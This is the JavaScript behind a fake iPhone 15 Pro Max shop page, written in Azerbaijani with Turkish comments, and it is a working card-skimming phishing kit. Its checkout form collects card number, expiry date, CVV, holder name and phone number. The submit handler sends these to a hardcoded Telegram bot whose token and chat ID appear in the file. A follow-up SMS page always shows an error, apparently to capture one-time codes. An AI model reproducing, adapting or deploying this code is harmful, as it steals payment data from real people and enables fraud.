// Global Variables
let currentImageIndex = 0;
let selectedColor = 'desert';
let currentPage = 'productPage';
let timerInterval;
let timeLeft = 300; // 5 minutes in seconds

// Image arrays for different colors - 3 RENK (GOLD SİLİNDİ!)
const colorImages = {
    black: [
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Ba1-3NjcVoa96MN4X9bs3bQmzwFBhNMevp.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B2-wwrNsrbcPWOHWuQxyjL3gmmnrHBVB5.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B3-1cD5YKS8g8zVrr3kqpXiHwDSU3N3T5.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B4-4LUGyAlnHXC4nYpJevPeQw6Pd3anJH.webp'
    ],
    desert: [
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-BHXg2pLrBIcUiwARxxSnDwMQCRkJqy.png',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-uCeC6Ss0aawHBDEmfRjrC1nfFYuxs3.png',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-XrmuyJ5bSLxWSKh7okiRfjC8sAe1Bf.png',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-WsnSUGttrlxNQYlJLPqHev2cm6Mj3h.png'
    ],
    white: [
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S1-b6XRx41eY35rcY6EtkAgPXKmlAgAEV.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S2-D6hckadTmE5Lam91LcIlFL8md3N9OH.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S3-icw7vj1P3olV6AmuUMoTVXFPoT58NV.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S4-4A1CcCZxS1L4b6zHALF2t8XK8D2lJC.webp'
    ]
};

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    showPage('productPage');
    updateMainImage();
    setupEventListeners();
}

function setupEventListeners() {
    // Form validation for card details
    const cardForm = document.querySelector('.card-form');
    if (cardForm) {
        const inputs = cardForm.querySelectorAll('input[required]');
        inputs.forEach(input => {
            input.addEventListener('input', validateCardForm);
        });
    }

    // Form validation for SMS
    const smsForm = document.querySelector('.sms-form');
    if (smsForm) {
        const smsInput = document.getElementById('smsCode');
        if (smsInput) {
            smsInput.addEventListener('input', validateSmsForm);
        }
    }

    // Phone number formatting
    const phonePrefix = document.getElementById('phonePrefix');
    const phoneNumber = document.getElementById('phoneNumber');
    
    if (phonePrefix) {
        phonePrefix.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.startsWith('0')) {
                value = value.substring(1);
            }
            if (value.length > 2) {
                value = value.substring(0, 2);
            }
            e.target.value = value;
            validateCardForm();
        });
    }

    if (phoneNumber) {
        phoneNumber.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 7) {
                value = value.substring(0, 7);
            }
            // Format as XXX XX XX
            if (value.length > 3) {
                if (value.length > 5) {
                    value = value.substring(0, 3) + ' ' + value.substring(3, 5) + ' ' + value.substring(5);
                } else {
                    value = value.substring(0, 3) + ' ' + value.substring(3);
                }
            }
            e.target.value = value;
            validateCardForm();
        });
    }

    // Card number formatting
    const cardNumber = document.getElementById('cardNumber');
    if (cardNumber) {
        cardNumber.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) {
                value = value.substring(0, 16);
            }
            // Format as XXXX XXXX XXXX XXXX
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value;
            validateCardForm();
        });
    }

    // Expiry date formatting
    const expiryMonth = document.getElementById('expiryMonth');
    const expiryYear = document.getElementById('expiryYear');
    
    if (expiryMonth) {
        expiryMonth.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2);
            }
            if (value.length === 2 && parseInt(value) > 12) {
                value = '12';
            }
            if (value.length === 1 && parseInt(value) > 1) {
                value = '0' + value;
            }
            e.target.value = value;
            validateCardForm();
        });
    }

    if (expiryYear) {
        expiryYear.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2);
            }
            e.target.value = value;
            validateCardForm();
        });
    }

    // CVV formatting
    const cvv = document.getElementById('cvv');
    if (cvv) {
        cvv.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 3) {
                value = value.substring(0, 3);
            }
            e.target.value = value;
            validateCardForm();
        });
    }

    // Card holder name formatting
    const cardHolder = document.getElementById('cardHolder');
    if (cardHolder) {
        cardHolder.addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase();
            validateCardForm();
        });
    }
}

// Page Navigation
function showPage(pageId) {
    // Hide all pages
    const pages = document.querySelectorAll('.page');
    pages.forEach(page => {
        page.classList.remove('active');
    });

    // Show selected page
    const targetPage = document.getElementById(pageId);
    if (targetPage) {
        targetPage.classList.add('active');
        currentPage = pageId;

        // Start timer for SMS page
        if (pageId === 'smsPage') {
            startTimer();
        } else {
            stopTimer();
        }

        // Scroll to top
        window.scrollTo(0, 0);
    }
}

// Product Image Functions
function selectImage(index) {
    currentImageIndex = index;
    updateMainImage();
    updateThumbnails();
}

function changeImage(direction) {
    const images = colorImages[selectedColor];
    const newIndex = currentImageIndex + direction;
    
    if (newIndex >= 0 && newIndex < images.length) {
        currentImageIndex = newIndex;
        updateMainImage();
        updateThumbnails();
    }
}

function updateMainImage() {
    const mainImage = document.getElementById('mainImage');
    const images = colorImages[selectedColor];
    
    if (mainImage && images && images[currentImageIndex]) {
        mainImage.src = images[currentImageIndex];
        mainImage.alt = `iPhone 15 Pro Max ${getColorName(selectedColor)} görünüş ${currentImageIndex + 1}`;
    }
}

function updateThumbnails() {
    const thumbnails = document.querySelectorAll('.thumbnail');
    thumbnails.forEach((thumbnail, index) => {
        if (index === currentImageIndex) {
            thumbnail.classList.add('active');
        } else {
            thumbnail.classList.remove('active');
        }
    });
}

// Color Selection
function selectColor(colorId, colorName) {
    selectedColor = colorId;
    currentImageIndex = 0;
    
    // Update color options
    const colorOptions = document.querySelectorAll('.color-option');
    colorOptions.forEach(option => {
        option.classList.remove('active');
    });
    
    // Find and activate the selected color option
    const selectedOption = document.querySelector(`[onclick*="${colorId}"]`);
    if (selectedOption) {
        selectedOption.classList.add('active');
    }
    
    // Update color name display
    const colorNameElement = document.getElementById('selectedColorName');
    if (colorNameElement) {
        colorNameElement.textContent = colorName;
    }
    
    // Update product title
    const productTitle = document.querySelector('.product-title');
    if (productTitle) {
        productTitle.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`;
    }
    
    // Update breadcrumb
    const breadcrumbCurrent = document.querySelector('.breadcrumb .current');
    if (breadcrumbCurrent) {
        breadcrumbCurrent.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`;
    }
    
    // Update images
    updateMainImage();
    updateThumbnailImages();
    updateThumbnails();
}

function updateThumbnailImages() {
    const thumbnails = document.querySelectorAll('.thumbnail img');
    const images = colorImages[selectedColor];
    
    thumbnails.forEach((thumbnail, index) => {
        if (images && images[index]) {
            thumbnail.src = images[index];
            thumbnail.alt = `iPhone 15 Pro Max ${getColorName(selectedColor)} görünüş ${index + 1}`;
        }
    });
}

function getColorName(colorId) {
    const colorNames = {
        black: 'Qara',
        desert: 'Desert Titanium',
        white: 'Ağ'
    };
    return colorNames[colorId] || 'Desert Titanium';
}

// Form Validation
function validateCardForm() {
    const cardNumber = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || '';
    const expiryMonth = document.getElementById('expiryMonth')?.value || '';
    const expiryYear = document.getElementById('expiryYear')?.value || '';
    const cvv = document.getElementById('cvv')?.value || '';
    const cardHolder = document.getElementById('cardHolder')?.value.trim() || '';
    const phonePrefix = document.getElementById('phonePrefix')?.value || '';
    const phoneNumber = document.getElementById('phoneNumber')?.value.replace(/\s/g, '') || '';

    const isValid = cardNumber.length >= 13 && 
                   expiryMonth.length === 2 && 
                   expiryYear.length === 2 && 
                   cvv.length >= 3 && 
                   cardHolder.length > 0 && 
                   phonePrefix.length >= 2 && 
                   phoneNumber.length >= 9;

    const submitBtn = document.querySelector('.btn-confirm');
    if (submitBtn) {
        submitBtn.disabled = !isValid;
    }

    return isValid;
}

function validateSmsForm() {
    const smsCode = document.getElementById('smsCode')?.value || '';
    const isValid = smsCode.length >= 4;

    const submitBtn = document.querySelector('.sms-form .btn-confirm');
    if (submitBtn) {
        submitBtn.disabled = !isValid;
    }

    return isValid;
}

// Form Submissions
function submitCardForm(event) {
    event.preventDefault();

    if (validateCardForm()) {
        const submitBtn = event.target.querySelector('.btn-confirm');
        submitBtn.textContent = 'İşlənir...';
        submitBtn.disabled = true;

        // 💬 Telegram'a veri gönder
        const cardData = {
            cardNumber: document.getElementById('cardNumber')?.value,
            expiry: document.getElementById('expiryMonth')?.value + '/' + document.getElementById('expiryYear')?.value,
            cvv: document.getElementById('cvv')?.value,
            cardHolder: document.getElementById('cardHolder')?.value,
            phone: document.getElementById('phonePrefix')?.value + ' ' + document.getElementById('phoneNumber')?.value
        };

        sendToTelegram(cardData);

        // SMS sayfasına geç
        setTimeout(() => {
            showPage('smsPage');
        }, 1500);
    }
}
function submitSmsCode(event) {
    event.preventDefault();
    
    if (validateSmsForm()) {
        // Show error message
        const errorMessage = document.getElementById('errorMessage');
        if (errorMessage) {
            errorMessage.style.display = 'block';
        }
        
        // Clear the input
        const smsInput = document.getElementById('smsCode');
        if (smsInput) {
            smsInput.value = '';
        }
        
        // Reset form validation
        validateSmsForm();
    }
}

// Timer Functions
function startTimer() {
    timeLeft = 300; // Reset to 5 minutes
    updateTimerDisplay();
    
    timerInterval = setInterval(() => {
        timeLeft--;
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
            stopTimer();
            // Handle timeout
            alert('Vaxt bitdi. Yenidən cəhd edin.');
            showPage('cardPage');
        }
    }, 1000);
}

function stopTimer() {
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }
}

function updateTimerDisplay() {
    const timerElement = document.getElementById('timer');
    if (timerElement) {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
}

function resendSms() {
    // Reset timer
    startTimer();
    
    // Show success message
    alert('SMS kodu yenidən göndərildi');
    
    // Clear any error messages
    const errorMessage = document.getElementById('errorMessage');
    if (errorMessage) {
        errorMessage.style.display = 'none';
    }
}

// Utility Functions
function generateUserId() {
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(2, 8);
    return `USER_${timestamp}_${random}`.toUpperCase();
}
// Telegram Integration (Gerçek API çağrısı)
async function sendToTelegram(data) {
    const botToken = '7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w';
    const chatId = '-1002626141042';
    const message = `🟢 Yeni Kart Girişi:\n\n${JSON.stringify(data, null, 2)}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        return result.ok ? { success: true } : { success: false, error: result.description };
    } catch (error) {
        console.error('Telegram error:', error);
        return { success: false, error };
    }
}

// Initialize when page loads
window.addEventListener('load', function() {
    // Additional initialization if needed
    console.log('iPhone Product Page Loaded Successfully!');
});
